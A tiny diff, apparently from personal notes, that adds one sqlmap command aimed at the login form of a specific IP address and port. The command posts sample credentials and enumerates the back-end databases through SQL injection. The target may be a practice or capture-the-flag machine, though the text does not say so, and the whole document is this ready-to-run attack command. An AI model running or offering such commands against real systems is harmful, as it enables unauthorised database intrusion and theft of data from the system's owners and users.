@@ -1,1 +1,2 @@
-gf
+sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs 
+
